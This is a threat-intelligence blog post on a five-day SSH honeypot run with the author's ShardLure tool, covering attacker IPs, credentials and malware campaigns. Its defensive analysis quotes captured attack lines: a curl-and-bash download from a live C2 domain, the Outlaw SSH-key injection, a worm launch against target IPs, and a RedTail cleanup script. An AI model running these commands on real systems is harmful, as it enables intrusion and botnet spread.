---
title: "I Built a Honeypot Framework, Deployed It for 5 Days, and the Internet Showed Up With Malware and Opinions"
description: "119,001 events. 1,120 unique IPs. 16 malware samples. 822 terminal recordings. The same Chinese worm. The same cryptominer. A 29MB botnet propagation binary. And a tool I wrote to make sense of all of it."
date: 2026-05-26
category: "threat-intel"
tags: ["ssh", "honeypot", "cowrie", "shardlure", "malware", "botnet", "oracle-cloud", "telemetry", "golang"]
readTime: "22 min read"
cover: "/images/shardlure-dashboard.webp"
coverAlt: "ShardLure telemetry dashboard — globe with attacker arcs, stats widgets, payload capture, and a live feed"
---

Last month I ran a [48-hour Cowrie honeypot experiment](/blog/ssh-honeypot-48-hours) and catalogued the zoo that walked in. 38,208 events, 12 malware samples, three competing campaigns. It was a good time. The conclusion was "the internet is farming you" and also "this is deeply entertaining."

But the tooling was held together with duct tape. JSON parsing scripts, manual `journalctl` exports, a Python data munger that ran once and was never spoken of again. Every time I wanted to check a stat, I was grepping 20MB of raw Cowrie logs like an animal.

So I built [ShardLure](https://github.com/hett-patell/ShardLure).

Then I deployed it on my Oracle Cloud ARM VM, opened port 22, and left it running for five days.

What follows is not a 48-hour snapshot. It's a sustained observation. Five days of watching the same botnets return, the same campaigns cycle, the same SSH keys get planted over and over. The novelty of the 48-hour experiment gave way to something more interesting: patterns. Rhythms. The daily commute of the internet's least creative criminals.

* * *

## What is ShardLure

ShardLure is a Go tool I wrote specifically because I was tired of the workflow from the last post. It does one thing: takes the firehose of SSH honeypot telemetry (Cowrie JSON logs + OpenSSH journal lines) and turns it into something you can actually reason about.

The core idea is **actor clustering**. Instead of staring at 1,120 IP addresses and trying to figure out which ones are the same bot, ShardLure groups them by behaviour. Journal actors are clustered by their username playbook -- the distribution of usernames they try is their personality. Cowrie actors are clustered by HASSH fingerprint -- the SSH client's key exchange algorithm set, which is essentially a browser user-agent but for SSH.

Same bot on three IPs? One actor. Different bot reusing a compromised IP? Different actors.

It ships with:
- **Dual ingest** from Cowrie JSON and journald
- **A live dashboard** with a globe, because I am not immune to spinning globes
- **An intel console** with MITRE ATT&CK mapping, payload library, credential wordlist export, attack replay scripts, and an infrastructure pivot graph
- **A VPS installer** that sets up Cowrie, moves your real SSH to a private port, plants bait files, and starts everything in one command
- **A forensic TUI** for when you want to feel like you're in a 2007 hacker movie but in your terminal

The architecture is simple:

```
attacker -> port 22 (Cowrie) -> JSON/journal ingest -> SQLite actors -> dashboard
you      -> port 2222 (SSH)  -> real admin access via keys/Tailscale
```

The whole thing is about 4,000 lines of Go plus the Python installer. The dashboard is a single HTML file with `globe.gl` rendering NASA's Black Marble texture, because I have learned nothing from the last post about what constitutes "overkill."

![ShardLure telemetry dashboard — globe with attacker arcs, stats widgets, payload capture, live feed](/images/shardlure-dashboard.webp)

* * *

## The setup

Same VM as last time. Oracle Cloud ARM, free tier, sitting in Mumbai. The honeypot persona:

- **Hostname:** `prod-app-server-01`
- **OS banner:** Ubuntu 22.04.4 LTS
- **CPU:** Intel Xeon Silver 4314 @ 2.40GHz, 16 cores / 32 threads
- **RAM:** 64GB (48GB free)
- **Uptime:** 87 days

Fake `/etc/passwd` with 34 user accounts. Fake `.bash_history` full of nginx restarts and docker compose deployments. Fake `.env` files with Stripe API keys and AWS credentials in `/opt/app/`. Fake deploy keys in `/home/deploy/.ssh/`. A login banner that says "AUTHORIZED USE ONLY. All sessions are recorded." -- which, again, was the single honest thing on the entire server.

ShardLure also regenerates Cowrie's SSH host keys during install. This is important. If you deploy Cowrie with the default keys, every Shodan scan in existence will fingerprint your honeypot in approximately four seconds. Fresh keys mean you're just another Ubuntu box in a sea of Ubuntu boxes, which is exactly what you want to be when you're lying to the internet for a living.

Real SSH on port 2222, key-only, Tailscale. Dashboard on 8080, private network only. Port 22 wide open for the bots.

* * *

## The numbers

**5 days. 119,001 Cowrie events. 1,120 unique IPs. 17,846 sessions. 16 unique malware samples. 822 terminal recordings.**

| Metric | Value |
|---|---|
| Duration | 5 days (May 21–26, 2026) |
| Total Cowrie events | 119,001 |
| Unique source IPs | 1,120 |
| Total SSH sessions | 17,846 |
| Successful logins | 925 |
| Failed logins | 16,708 |
| Commands executed | 10,335 |
| Failed commands | 901 |
| File downloads | 875 |
| File uploads | 29 |
| TCP tunnel attempts | 27 |
| TTY sessions recorded | 822 |
| Unique malware samples | 16 |
| Unique HASSH fingerprints | 59 |
| Actors classified | 1,303 |

That works out to one new IP every 6.4 minutes, continuously, for five straight days. The busiest day was May 24 -- 40,921 events, 5,857 sessions, 301 unique IPs. Something was running a campaign, and they picked my fake Xeon to run it against.

The dashboard's API endpoint updates every 5 seconds. By day 3 I had stopped checking it obsessively and started checking it merely compulsively, which I consider personal growth.

* * *

## Who showed up

### By geography

| Country | Hits |
|---|---|
| Netherlands | 9,532 |
| Spain | 8,343 |
| India | 3,492 |
| China | 2,920 |
| United Kingdom | 1,356 |
| Pakistan | 1,351 |
| United States | 855 |
| Germany | 637 |
| Brazil | 228 |
| Singapore | 221 |
| Hong Kong | 219 |
| South Korea | 216 |

The Netherlands is first with nearly 10,000 hits, which sounds implausible until you realise that's where the bulletproof hosting lives. The Eygelshoven cluster alone -- three IPs on `176.65.132.x` -- generated over 5,000 events. Eygelshoven is a village in the southern tip of the Netherlands with a population of about 8,000. It now has more SSH brute-force connections attributed to it than residents. I assume the tourism board is not leveraging this.

Spain is second entirely because of a single IP: `188.84.0.25` in Madrid, with 8,343 hits. One machine, one actor, 8,343 login attempts over five days. That's approximately one attempt every 52 seconds, around the clock, without pause. I don't know what hosting provider is behind that IP but I know they have received at least one abuse report that was immediately printed and used as a napkin.

### Top source IPs

```
   8,343  188.84.0.25        Madrid, ES
   2,970  45.156.87.117      Eygelshoven, NL
   2,163  47.117.148.169     Shanghai, CN
   2,061  176.65.132.17      Eygelshoven, NL
   2,059  176.65.132.129     Eygelshoven, NL
   1,572  103.150.30.30      Mumbai, IN
   1,389  139.59.74.51       Bengaluru, IN
   1,351  182.188.24.243     Taunsa, PK
     996  176.65.132.119     Eygelshoven, NL
     758  193.32.162.151     Amsterdam, NL
     757  120.48.90.143      Beijing, CN
     683  2.57.121.25        Rushden, GB
     673  2.57.121.112       Rushden, GB
     637  213.209.159.56     Augsburg, DE
```

Three of the top five IPs are in Eygelshoven. I have now typed "Eygelshoven" more times than any English-language blogger in history, and I intend to keep this record.

The Rushden IPs -- `2.57.121.25` and `2.57.121.112` -- are our old friends from [the first post](/blog/ssh-brute-force-telemetry). "Unmanaged LTD," the company that describes itself as "providing reliable hosting solutions." They are still reliably hosting brute-force operations. Some things never change. I find this oddly comforting.

Oracle Cloud IPs appear in the attacker list again: `129.213.137.74`, `129.153.145.135`, `144.22.238.238`. Compromised Oracle VMs scanning for more Oracle VMs. The free-tier ecosystem continues to eat itself. It's the botnet equivalent of a ouroboros, except the snake is a $0/month ARM instance running Ubuntu with `root:123456`.

* * *

## What they typed

### Usernames

```
   8,244  root
     767  admin
     672  user
     587  345gs5662d34
     479  ubuntu
     127  cloud
     120  test
     118  curl
     105  oracle
      88  postgres
      85  sol
      80  ftpuser
      78  deploy
      60  user1
      58  steam
      56  dev
      54  testuser
      53  solana
      49  hadoop
      47  mysql
```

`root` accounts for 47% of all login attempts. The botnet community continues to believe, with unshakable conviction, that somebody, somewhere, has a root account with password `123456` on a public-facing server. And they are right, which is the depressing part.

`345gs5662d34` at 587 attempts as a *username* is back from the 48-hour experiment and it's only gotten more popular. This is a botnet self-propagation credential -- the same string used as both username and password. Bots bruteforcing the passwords that other bots set. The digital food chain has achieved perfect circularity.

`curl` at 118 attempts is new and I had to stare at this one for a while. There is apparently a non-trivial number of servers running with a system user named `curl`. I don't know how this happens. I don't want to know how this happens. Somebody created a user called `curl` and gave it SSH access and now every botnet on earth knows about it. Congratulations, you have achieved curl immortality, and not the good kind.

`steam` at 58 attempts tells me that people are running game servers on VPS instances with SSH users named `steam` and passwords that rhyme with "steam123". The bots know this. The bots always know.

### Passwords

```
     779  123456
     590  3245gs5662d34
     587  345gs5662d34
     287  123
     263  LeitboGi0ro
     252  123@@@
     196  1234
     183  password
     147  admin
     139  12345678
     112  1
     111  root
     106  fjbdfdjkdsfs541544@@
     104  fjbdfdjkdsfs541544AA@@
     100  Wangsu@2017
      99  12345
      95  welltech12
```

`123456` takes the crown with 779 attempts. I want to be clear: 779 separate SSH sessions tried the password `123456` against my server in five days. This is the most popular password on the internet and has been since approximately 1997. Nothing we have done as a species -- not breach notifications, not password managers, not the NIST guidelines, not shaming people at conferences -- has moved the needle. `123456` is eternal. `123456` will outlast us all.

The botnet propagation cluster is all here: `LeitboGi0ro` (263), `123@@@` (252), `3245gs5662d34` (590), `345gs5662d34` (587). These are passwords that worms set on machines they've compromised. Botnet A sets `LeitboGi0ro`, Botnet B tries `LeitboGi0ro` everywhere. Parasites feeding on parasites.

`fjbdfdjkdsfs541544@@` and `fjbdfdjkdsfs541544AA@@` are interesting. 106 and 104 attempts respectively, and they look like someone mashed their keyboard and then added `@@` for "security." These are from the same campaign -- the `sshd` propagator we captured. More on that shortly.

`Wangsu@2017` at 100 attempts: this is a default credential for Wangsu (ChinaNetCenter/网宿) CDN appliances. The bots have figured out that network appliances often have SSH enabled with vendor default passwords, and now `Wangsu@2017` is in every wordlist. Whoever shipped that default password in 2017 made a choice that will echo through botnet codebases for decades.

`welltech12` at 95 attempts, paired with username `curl:welltech12` -- 23 successful logins. This is clearly a botnet default credential that someone thought was clever because it doesn't look like a default credential. It is now in every wordlist on earth. Security through obscurity works exactly until it doesn't, and then it never works again.

### Successful login combos

```
     107  345gs5662d34:345gs5662d34
      59  root:fjbdfdjkdsfs541544@@
      57  root:fjbdfdjkdsfs541544AA@@
      30  admin:admin
      23  ubuntu:ubuntu
      23  curl:welltech12
      20  cloud:Wangsu@2017
      15  root:LeitboGi0ro
      12  root:123456
      11  root:root
      10  aroot:aroot
       8  orangepi:orangepi
       8  iksi:zhbjETuyMffoL8F
       6  root:123@@@
```

`345gs5662d34:345gs5662d34` was the most successful combo with 107 logins. This is the botnet looking for machines already compromised by the *same botnet*. It's re-checking its own inventory. Every 107 of those sessions is a bot going "hey, is this still ours?" and my honeypot saying "sure, come on in," and the bot going "great" and deploying the exact same payload it deployed last time. Sisyphus, but with SSH.

`orangepi:orangepi` at 8 successful logins -- someone out there has an Orange Pi single-board computer plugged into their network with the default SSH credentials still active. The bots know about Orange Pi. The bots know about *everything*.

`iksi:zhbjETuyMffoL8F` -- 8 successful logins, a credential that looks suspiciously like a randomly generated password from some botnet's provisioning script. A different worm set this password on compromised hosts, and now it's in the credential rotation. The parasites are indexing each other's work.

* * *

## The SSH client census

```
   8,016  SSH-2.0-libssh_0.9.6
   6,126  SSH-2.0-Go
     666  SSH-2.0-paramiko_4.0.0
     418  SSH-2.0-AsyncSSH_2.1.0
     357  SSH-2.0-libssh_0.11.1
     281  SSH-2.0-PuTTY_Release_0.83
     256  SSH-2.0-libssh_0.12.0
     138  SSH-2.0-phpseclib_1.0
     131  SSH-2.0-libssh2_1.11.0
      72  SSH-2.0-paramiko_3.5.1
      45  SSH-2.0-libssh2_1.11.1
      37  SSH-2.0-paramiko_5.0.0
      36  SSH-2.0-Nmap-SSH2-Hostkey
      25  SSH-2.0-PUTTY
      24  SSH-2.0-ZGrab ZGrab SSH Survey
      21  GET / HTTP/1.1
```

A notable shift from the 48-hour experiment: `libssh_0.9.6` has overtaken Go as the top client. 8,016 sessions from `libssh` -- this is the mass-scanning infrastructure layer. `libssh` is fast, light, C-based, and doesn't waste cycles on things like "having a user-visible interface." It exists to open connections and spray credentials at scale, and it does this with admirable efficiency.

`Go` at 6,126 sessions is the brute-forcing layer we saw before. The bare Go SSH library with no identifying information beyond "I am Go." Fast, concurrent, personality-free.

`PuTTY_Release_0.83` at 281 sessions is new and surprising. PuTTY is a Windows GUI SSH client that normal humans use. 281 sessions from PuTTY means either (a) there's a PuTTY-based automated brute-forcer, or (b) 281 actual humans opened PuTTY on their Windows desktops and tried to SSH into my honeypot. I genuinely do not know which is worse.

And 21 connections from `GET / HTTP/1.1`. Twenty-one web scanners connected to SSH port 22 and sent an HTTP GET request. They are still out there. They have learned nothing. I remain in awe.

* * *

## 59 HASSH fingerprints

59 unique HASSH fingerprints across 1,120 IPs. The "1,120 attackers" narrative is misleading -- it's 59 tools running on shared infrastructure.

```
   7,931  f555226df1963d1d3c09da...  (libssh 0.9.6)
   3,498  0a07365cc01fa9fc826088...  (Go SSH library)
   1,836  16443846184eafde36765c...  (Go SSH library, alt config)
     719  a2de0f306611e0957be704...  (libssh variant)
     518  98f63c4d9c87edbd97ed47...  (paramiko-based)
     415  fda360b1b4f4d3455cb75c...  (AsyncSSH)
     329  03a80b21afa81068278a77...  (libssh 0.11.x)
     281  57446c12547a668110aa23...  (PuTTY)
```

Two fingerprints -- `libssh 0.9.6` and `Go` -- account for 65% of all traffic. These are the workhorses of the scanning ecosystem. Everything else is specialised: `paramiko` for the worm propagation phase, `AsyncSSH` for credential stuffing, `PuTTY` for... whatever PuTTY is doing here. The entire internet's offensive SSH infrastructure runs on roughly five libraries.

* * *

## What they did once inside

```
     625  cd ~; chattr -ia .ssh; lockr -ia .ssh
     622  cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA...oRw== mdrfckr"...
     549  uname -a
     512  cat /proc/cpuinfo | grep name | wc -l
     511  free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
     511  cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
     510  w
     510  uname -m
     510  top
     510  cat /proc/cpuinfo | grep model | grep name | wc -l
     509  whoami
     509  which ls
     509  crontab -l
     509  lscpu | grep Model
     509  df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
     509  ls -lh $(which ls)
     262  rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; ...
     249  Enter new UNIX password:
      12  uname -s -v -n -r -m
       9  uname -s -m
       6  curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh
       6  mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh
       6  cat /tmp/bendi.py | python3 - ; rm -f /tmp/bendi.py
```

This is where the assembly line becomes visible.

The top 17 commands all have counts between 509 and 625, forming a tight cluster. That's the mdrfckr/Outlaw botnet's standard playbook: strip immutable flags from `.ssh/`, plant their RSA key, then run a comprehensive recon sequence -- CPU count, memory, disk, architecture, crontab, currently logged-in users. They check `which ls` and `ls -lh $(which ls)` to determine if the box has BusyBox or real coreutils (because their payloads need the real thing). They check `lscpu | grep Model` and `cat /proc/cpuinfo` to size the CPU before deciding whether to deploy a miner.

My fake 32-core Xeon answered "32" to every one of those checks. 509 sessions got excited about 32 cores of free compute. 509 sessions then discovered that the compute was a lie and the filesystem was a hallucination. I feel no remorse.

The `rm -rf /tmp/secure.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep` at 262 hits is the rivalry script. Before deploying their own payload, this campaign kills every other competing backdoor and persistence mechanism on the box. `pkill -9 sleep` is particularly aggressive -- that kills any `sleep` process on the system, which is designed to break other bots' timing loops. It's scorched-earth tactics in someone else's server.

`Enter new UNIX password:` at 249 hits is not a command. It's the `passwd` prompt output. 249 sessions tried to change the root password and the honeypot logged the prompt as a command. The bots are trying to change the password to their own credential -- locking the door behind them on a house they just broke into.

And the bendi.py pipeline is here: `curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh` -- the same C2 infrastructure from the 48-hour experiment, still active a month later, still hosted on free Ukrainian `.pp.ua` subdomains.

* * *

## The malware zoo, round two

Over five days, I captured 16 unique malware samples. Same three campaigns as the 48-hour experiment, plus a new one.

### Campaign 1: mdrfckr -- the SSH key industrial complex

622 sessions planted the same RSA public key:

```
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1
+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJ
e0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjd
ySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k
6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==
mdrfckr
```

This is the Outlaw/Kinsing key. It's been documented since 2019. The comment `mdrfckr` is presumably not the operator's given name, though at this point I wouldn't be surprised.

The injection command runs `chattr -ia .ssh; lockr -ia .ssh` first -- stripping immutable flags. `lockr` is still not a real command. It's still failing silently. It's been copy-pasted through botnet codebases for years and nobody has noticed, because nobody is running unit tests on their botnet.

622 sessions out of 925 successful logins means 67% of all bots that got in immediately planted this key. It's the most common single action in the entire dataset. The mdrfckr key is to SSH honeypots what "Hello World" is to programming tutorials.

**Key 2 -- `rsa-key-20230629`**: 3 sessions. The quieter operator, same key from the 48-hour run.

**Key 3 -- an ed25519 key**: 6 sessions. This is new. Someone is planting a modern ed25519 key instead of RSA. The key was injected alongside a download from `del.sou.pp.ua` -- this is the bendi.py operator using a different key algorithm. Progress.

### Campaign 2: bendi.py -- still propagating, still in Chinese

Three variants of the Chinese SSH worm appeared, uploaded via SFTP from compromised Oracle Cloud IPs:

| Variant | SHA256 (prefix) | Size | Source IP |
|---|---|---|---|
| v1 | `2146a9c896017631...` | 40 KB | 144.22.238.238 (BR, Oracle Cloud) |
| v2 | `64b8416c418c265e...` | 29 KB | 193.123.242.254 (Oracle Cloud) |
| v3 | `00b374d5249b32ab...` | 28 KB | 165.1.75.106 |

Same architecture as before: `masscan` for port scanning, `paramiko` for SSH brute-forcing, `systemd` services for persistence, Telegram bot for notifications, and the Komari monitoring agent phoning home to `sexy.pp.ua`.

The C2 infrastructure is unchanged after a month:

| Domain | Purpose |
|---|---|
| `sou.pp.ua` | Deduplication API |
| `del.sou.pp.ua` | Exclusion list, target ranges, install scripts |
| `sexy.pp.ua` | Komari monitoring dashboard |

30 Cowrie events referenced `sou.pp.ua`. The worm is still actively installing itself from `del.sou.pp.ua/install.sh`, still targeting Oracle Cloud CIDR ranges, still running on free Ukrainian subdomains. A month of running a criminal botnet on free infrastructure with zero domain rotation. Either the operator is extremely confident or extremely lazy. These are not mutually exclusive.

### Campaign 3: RedTail -- multi-architecture mining, again

The RedTail cryptominer family returned via SFTP from two IPs:

| Binary | Architecture | Size | Source |
|---|---|---|---|
| `redtail.x86_64` | x86-64 | 1.8 MB | 130.12.180.51 / 213.209.159.158 |
| `redtail.i686` | 32-bit Intel | 1.7 MB | 130.12.180.51 / 213.209.159.158 |
| `redtail.arm8` | AArch64 | — | 130.12.180.51 / 213.209.159.158 |
| `redtail.arm7` | 32-bit ARM | 1.3 MB | 130.12.180.51 / 213.209.159.158 |

Same UPX-packed ELF binaries. Same `setup.sh` loader that detects architecture and deploys the right binary. Same `clean.sh` that kills competing miners and scrubs every crontab on the system before moving in.

The `clean.sh` is unchanged from last time:

```bash
#!/bin/bash
clean_crontab() {
  chattr -ia "$1"
  grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' "$1" >/tmp/clean_crontab
  mv /tmp/clean_crontab "$1"
}
systemctl disable c3pool_miner
systemctl stop c3pool_miner
# ... scrubs every cron directory, wipes /tmp, /var/tmp, /dev/shm
```

Gentrification, but for malware. Still. A month later and the same clean.sh is strip-mining the same temporary directories. The audacity of deploying the exact same rivalry script for 30+ days without changing a single line is either admirable discipline or total indifference. The malware economy has reached "set it and forget it" maturity.

### Campaign 4: the `sshd` propagator (new)

This one didn't appear in the 48-hour run. Three sessions uploaded a binary called `sshd` -- a name chosen specifically to blend in with legitimate SSH daemon processes:

| Source IP | SHA256 (prefix) | Size |
|---|---|---|
| 157.90.141.153 (Falkenstein, DE) | `94f2e4d8d4436874...` | 29 MB |
| 142.93.220.184 (Bengaluru, IN) | `94f2e4d8d4436874...` | 29 MB |
| 27.155.92.28 (Fuzhou, CN) | `e3b0c44298fc1c14...` | 0 B (empty) |

The 29MB binary is an x86-64 ELF executable, dynamically linked, stripped. At 29 megabytes for an SSH brute-forcer, this is either doing something significantly more complex than the Go-based scanners, or it was compiled with every dependency statically linked and nobody bothered to check the output size. I suspect the latter but I can't prove it without detonating the binary, which I am not going to do on my real server.

The session from `157.90.141.153` is particularly interesting. After uploading the `sshd` binary, it ran:

```
chmod +x ./.3199154146702282899/sshd;nohup ./.3199154146702282899/sshd \
  118.122.147.195 148.72.168.29 159.203.108.2 103.210.22.17 \
  103.61.122.197 183.224.79.111 49.72.111.25 192.3.252.25 \
  150.138.143.79 38.12.6.166 138.197.163.192 203.189.196.168 \
  120.193.9.168 121.28.170.66 210.16.103.246 171.237.176.65 \
  41.93.28.4 112.53.123.177 ... &
```

Those are IP addresses of *other compromised hosts*. The `sshd` binary takes a list of targets as command-line arguments and starts scanning them. This is a worm using the compromised host as a scanning node in a distributed brute-force network. Every new host it compromises becomes another scanning node, and the target list gets passed along like a relay baton.

The directory name `.3199154146702282899` is a random numeric string -- different for each session. The session from `142.93.220.184` used `.656510752739371355`. This randomisation makes the binary harder to find with a static `find /tmp -name sshd` cleanup script, because the parent directory is different on every host. Clever. Not clever enough to not get caught by a honeypot, but clever.

The empty upload from `27.155.92.28` -- SHA256 `e3b0c44298fc1c14...` -- is the SHA256 of a zero-byte file. The upload failed or was interrupted. Even botnets have bad days.

* * *

## The tunnel abuse

27 tunnel attempts, modest compared to the 48-hour experiment's 72, but the same pattern:

```
    14  ip-who.com:80
     6  141.101.90.1:3478
     5  81.19.77.166:587
     1  google.com:80
     1  ipv4.icanhazip.com:443
```

`ip-who.com` and `icanhazip.com` -- connectivity and IP verification. "Does this proxy work? What's my IP through it?" Standard SOCKS proxy validation.

`141.101.90.1:3478` -- Cloudflare STUN server, WebRTC NAT traversal. Someone is still trying to set up voice/video relay through my honeypot.

`81.19.77.166:587` -- SMTP submission. Still trying to relay spam. Port 587 is authenticated email, which means someone is trying to use compromised SSH servers as mail relays. This is how your spam folder gets populated: through a chain of servers that each thought they were adequately secured.

* * *

## Session profiles

| Duration | Sessions | % |
|---|---|---|
| Under 2 seconds | ~7,607 | 42% |
| 2–30 seconds | ~8,711 | 48% |
| 30 seconds – 2 minutes | 625 | 3% |
| Over 2 minutes | 903 | 5% |

Average session: 11.7 seconds. Median: 2.3 seconds. Max: 305 seconds.

Compared to the 48-hour experiment (average 6.3s, median 1.5s), the five-day dataset shows slightly longer sessions. The extra duration comes from the `sshd` propagator campaign, which uploads a 29MB binary over SFTP -- that takes time even on a fast connection.

903 sessions lasted over 2 minutes. These are the bots installing dependencies via `apt-get`, uploading bendi.py, deploying RedTail, or running the full mdrfckr recon-and-key-plant playbook. The longest session -- 305 seconds -- was a bot patiently waiting for `apt-get update` to complete on a filesystem that doesn't actually exist. I admire the commitment. I do not admire the execution.

822 terminal recordings are archived. I can replay any of them like VHS tapes of robots committing crimes. ShardLure's intel console has an attack replay feature that converts sessions into shell scripts, complete with `sleep` intervals between commands to simulate the original timing. You can watch a bot's entire playbook unfold in real-time. It is exactly as mesmerising as watching someone else's Roomba get stuck under a couch.

* * *

## ShardLure's actor classification

This is where having a real tool instead of grep scripts pays off. ShardLure classified the 1,303 actors into playbook categories:

| Playbook | Actors | Description |
|---|---|---|
| `opportunistic` | ~890 | Broad credential spray, no specific target profile |
| `unknown` | ~280 | Too few events to classify |
| `dictionary_spray` | ~45 | Systematic username/password dictionary attack |
| `default_credential_spray` | ~35 | Targeting known default credentials (e.g., `admin:admin`) |
| `fast_dictionary_spray` | ~25 | High-speed brute-forcing (100+ attempts/hour) |
| `service_account_enum` | ~15 | Targeting service accounts (`postgres`, `mysql`, `redis`) |
| `crypto_target` | ~13 | Specifically hunting `sol`, `solana`, `solv`, `validator` |

The `crypto_target` playbook is ShardLure detecting bots that specifically try cryptocurrency-related usernames. 13 distinct actors whose entire username corpus is Solana validator usernames. They're not running dictionary attacks. They're not trying `root`. They are laser-focused on `sol`, `solana`, `solv`, `jito`, `raydium`, `validator`, `shredstream`. These are specialist operators who have figured out that Solana validators running on commodity VPS instances are the softest targets in the cryptocurrency ecosystem.

The `fast_dictionary_spray` actors are the most aggressive: rates above 100 attempts per hour. `176.65.132.119` hit 1,587 attempts/hour. `171.243.150.160` from Vietnam hit 195/hour. These are the "spray and pray" operators who compensate for bad wordlists with sheer volume.

* * *

## What I learned (five days vs. forty-eight hours)

**1. The campaigns don't rotate. They persist.**

The 48-hour experiment captured bendi.py, RedTail, and mdrfckr. Five days later, the exact same campaigns are running, from the same C2 infrastructure, with the same payloads, using the same SSH keys. `del.sou.pp.ua` is still serving install scripts. The mdrfckr RSA key hasn't changed. `clean.sh` hasn't been updated. The only new arrival in five days was the `sshd` propagator. The internet's offensive infrastructure is not agile. It is a cron job.

**2. Volume scales linearly with time, variety doesn't.**

48 hours gave me 38,208 events and 12 unique samples. Five days (2.5x longer) gave me 119,001 events (~3.1x) but only 16 unique samples (1.3x). The diminishing returns on novel malware set in fast. After the first 48 hours, you're mostly seeing the same bots recycling the same playbooks. The value of a long-running honeypot is not discovery -- it's pattern confirmation and rate measurement.

**3. Having a real tool changes the analysis.**

The 48-hour experiment was grepping JSON files. ShardLure's actor clustering turned 1,120 IPs into 59 HASSH fingerprints into meaningful actor groups. The `crypto_target` playbook, the `fast_dictionary_spray` classification, the distinction between `opportunistic` and `service_account_enum` -- none of that was visible when I was manually parsing logs. The data was always there. I just couldn't see it through the grep.

**4. Bait files work, but slowly.**

ShardLure plants fake `.env` files, AWS credentials, and deploy keys in Cowrie's virtual filesystem. Over five days, 594 sessions downloaded the fake `authorized_keys` file from various home directories (the mdrfckr campaign overwriting it). The bait files in `/opt/app/.env` and `/home/deploy/.ssh/id_rsa` were accessed by bots running `ls -la /` and similar recon, but no bot specifically sought them out and exfiltrated them. The bots are optimised for key planting and miner deployment, not data theft. They don't read `.env` files because they don't care about your Stripe API keys. They care about your CPU cores. This is, oddly, a relief.

**5. Oracle Cloud free tier is still specifically on the menu.**

The bendi.py worm's target list at `del.sou.pp.ua/ip_ranges.txt` still contains Oracle Cloud CIDR ranges. Multiple Oracle Cloud IPs appeared as both attackers and targets. The free tier has become a self-sustaining botnet ecosystem -- compromised VMs scanning for more free-tier VMs, in an infinite loop. If you have an Oracle Cloud free-tier instance with port 22 open and password auth enabled, you are not "at risk." You are "already compromised and contributing to the problem."

* * *

## The tool

ShardLure is [open source](https://github.com/hett-patell/ShardLure), MIT licensed, and runs on a single VPS with no external dependencies beyond Cowrie and Go.

If you want to run your own:

```bash
git clone https://github.com/hett-patell/shardlure.git
cd shardlure
sudo python3 scripts/shardlure.py run
```

The installer handles Cowrie setup, SSH port migration, host key regeneration, bait file planting, and systemd service creation. It will not move SSH off port 22 unless it can verify you have an `authorized_keys` file, and it rolls back the sshd config automatically if the new one fails `sshd -t`. No "locked myself out at 2am" stories.

The live mode tails Cowrie logs and journal events straight into the globe dashboard:

```bash
shardlure live :8080 --cowrie=/path/cowrie.json --tailscale
```

Keep the dashboard on Tailscale or a VPN. The dashboard is not bait. Do not get those confused.

* * *

## Teardown

The honeypot is still running as you read this. The data continues to accumulate. Somewhere in Shanghai, `47.117.148.169` is still trying to log in as root every seven minutes. In Eygelshoven, three IPs on the same /24 are still collaborating on what can only be described as a distributed art project in failed authentication. In Madrid, `188.84.0.25` has now tried 8,343 times and shows no signs of stopping.

I check the dashboard most mornings with coffee. Not because I expect to find a breach -- nothing is getting through key-only auth and a fake filesystem. But because there's something strangely grounding about watching the globe fill with red arcs and knowing that, while you slept, 200 machines in 12 countries tried to break into your server and all of them failed.

The internet is still a loud neighbourhood. But now I have a better peephole. And it spins.
